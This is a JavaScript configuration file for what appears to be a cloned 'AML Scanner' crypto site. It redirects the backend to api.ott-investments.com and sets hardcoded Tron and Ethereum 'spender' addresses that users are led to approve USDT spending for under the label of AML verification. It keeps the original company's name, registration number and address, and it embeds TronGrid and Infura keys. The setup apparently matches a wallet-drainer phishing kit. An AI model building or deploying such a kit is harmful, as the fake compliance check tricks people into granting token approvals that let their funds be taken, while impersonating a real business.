/**
 * AML Scanner Configuration
 * 
 * IMPORTANT: This file contains all the endpoints and addresses from the original amlscanner.org
 * You need to replace these with your own infrastructure to make the application fully functional.
 */

export const AML_CONFIG = {
  // =================================================================
  // API ENDPOINTS - REPLACE WITH YOUR OWN BACKEND
  // =================================================================
  
  /**
   * Main API URL for AML Scanner backend
   * Original: https://api-second.amlscanner.org
   * 
   * TODO: Replace with your own backend API URL
   * Your backend needs to implement these endpoints:
   * - POST /addresses/check - For wallet address verification
   * - WebSocket /session - For real-time wallet connection updates
   */
  API_URL: process.env.NODE_ENV === 'production' 
    ? "https://api.ott-investments.com" 
    : "http://localhost:8080", // Use local backend in development, remote in production
  
  /**
   * Socket.IO WebSocket URL for real-time updates
   * Original: https://api-second.amlscanner.org/session
   * 
   * TODO: Set up your own Socket.IO server that handles:
   * - 'uri' event: Sends WalletConnect URI for QR code generation
   * - 'failed' event: Connection failure notifications
   * - 'success' event: Successful wallet connection confirmation
   */
  WEBSOCKET_URL: process.env.NODE_ENV === 'production'
    ? "https://api.ott-investments.com"
    : "http://localhost:8080", // Use local backend in development, remote in production

  // =================================================================
  // SMART CONTRACT ADDRESSES - REPLACE WITH YOUR OWN
  // =================================================================
  
  /**
   * USDT Contract Addresses on different networks
   * These are the official USDT contract addresses
   * 
   * NOTE: These are standard USDT addresses, usually don't need to change
   * unless you're using custom USDT tokens
   */
  USDT_CONTRACTS: {
    ethereum: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT on Ethereum
    tron: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" // USDT on Tron
  },

  /**
   * Spender Address - Your Smart Contract Address
   * Original: TLjHd9yiRXMRFqyFnWGQKE8rPvr3ZTLPTH
   * 
   * TODO: CRITICAL - Replace with your own smart contract address
   * This is the contract that users will approve USDT spending for.
   * This should be your AML verification contract address.
   */
  SPENDER_ADDRESS: "TNiz79rN7LWd86zzgPRYAudPn1vgckcMFn",

  /**
   * Ethereum Spender Address - Your Smart Contract Address for ERC20
   * 
   * This is the contract that users will approve USDT spending for on Ethereum.
   * This should be your AML verification contract address for Ethereum network.
   */
  ETH_SPENDER_ADDRESS: "0xf8c25D13A07651D888d606Da7Aa6C311fc6413e8",

  ethereum: {
    amount: "1000000" // 1 USDT in base units (6 decimals)
  },

  // =================================================================
  // BLOCKCHAIN ENDPOINTS - REPLACE WITH YOUR OWN API KEYS
  // =================================================================
  
  /**
   * TronGrid API Configuration
   * Original uses public endpoints
   * 
   * TODO: For production, get your own TronGrid API key from:
   * https://www.trongrid.io/
   * 
   * Replace 'YOUR_API_KEY_HERE' with your actual API key
   */
  TRON_GRID: {
    mainnet: "https://api.trongrid.io/a996a59a-8e82-4e52-aab8-4bd7dd73644f",
    // For production with API key:
    // mainnet: "https://api.trongrid.io/YOUR_API_KEY_HERE",
  },

  /**
   * Ethereum/Infura Configuration
   * 
   * TODO: For Ethereum functionality, get API key from:
   * https://infura.io/
   * 
   * Replace 'YOUR_PROJECT_ID' with your actual Infura project ID
   */
  ETHEREUM_RPC: {
    mainnet: "https://mainnet.infura.io/v3/07908a5d9d154d3194e445bceb298d28",
    // Alternative: Alchemy
    // mainnet: "https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY",
  },

  // =================================================================
  // HARDWARE WALLET CONFIGURATION
  // =================================================================
  
  /**
   * Ledger Integration
   * 
   * TODO: To enable Ledger hardware wallet support, install:
   * npm install @ledgerhq/hw-transport-webhid @ledgerhq/hw-transport-webusb @ledgerhq/hw-app-trx @ledgerhq/hw-app-eth
   * 
   * Then uncomment and configure the imports in AMLForm.js
   */
  LEDGER_ENABLED: false, // Set to true when Ledger libraries are installed

  // =================================================================
  // EMAIL AND SUPPORT CONFIGURATION  
  // =================================================================
  
  /**
   * Support and Contact Information
   * Original: support@amlscanner.org
   * 
   * TODO: Replace with your own support email and contact info
   */
  SUPPORT_EMAIL: "support@amlscanner.org",
  TELEGRAM_SUPPORT: "https://t.me/virtualybuilder",
  
  /**
   * Company Information
   * Original: AML Scanner LTD
   * 
   * TODO: Replace with your own company information
   */
  COMPANY: {
    name: "AML Scanner LTD",
    registration: "14612986",
    address: "17 City North Place, London, N4 3FU, GBR",
    email: "support@amlscanner.org"
  },

  // =================================================================
  // DOCUMENTATION AND EXTERNAL LINKS
  // =================================================================
  
  /**
   * Documentation Links
   * Original: https://aml-scanner.gitbook.io/aml-scanner-docs
   * 
   * TODO: Replace with your own documentation URL
   */
  DOCS_URL: "https://aml-scanner.gitbook.io/aml-scanner-docs",

  // =================================================================
  // DEVELOPMENT VS PRODUCTION SETTINGS
  // =================================================================
  
  /**
   * Environment Configuration
   */
  ENVIRONMENT: process.env.NODE_ENV || 'development',
  
  /**
   * Debug Mode - Set to false in production
   */
  DEBUG_MODE: process.env.NODE_ENV === 'development',
};

/**
 * Get API URL based on environment
 */
export const getApiUrl = () => {
  if (process.env.NODE_ENV === 'production') {
    return 'https://api.ott-investments.com';
  }
  // In development, point to the local backend server
  return 'http://localhost:8080';
};

/**
 * Get WebSocket URL based on environment
 */
export const getWebSocketUrl = () => {
  if (process.env.NODE_ENV === 'production') {
    return 'https://api.ott-investments.com';
  }
  // In development, point to the local backend server
  return 'http://localhost:8080';
};

/**
 * Check if all required configuration is set
 */
export const validateConfig = () => {
  const errors = [];
  
  if (AML_CONFIG.SPENDER_ADDRESS === "TNiz79rN7LWd86zzgPRYAudPn1vgckcMFn") {
    errors.push("SPENDER_ADDRESS needs to be replaced with your own contract address");
  }
  
  if (AML_CONFIG.API_URL.includes("api.ott-investments.com") && AML_CONFIG.ENVIRONMENT === 'development') {
    errors.push("Using production API in development environment - consider using a local backend");
  }
  
  if (AML_CONFIG.ETHEREUM_RPC.mainnet.includes("YOUR_PROJECT_ID")) {
    errors.push("Ethereum RPC endpoint needs a valid Infura/Alchemy API key");
  }
  
  if (errors.length > 0 && AML_CONFIG.DEBUG_MODE) {
    console.warn("⚠️ AML Scanner Configuration Warnings:");
    errors.forEach(error => console.warn(`- ${error}`));
    console.warn("See src/config/amlscanner-config.js for setup instructions");
  }
  
  return errors;
};

export default AML_CONFIG;
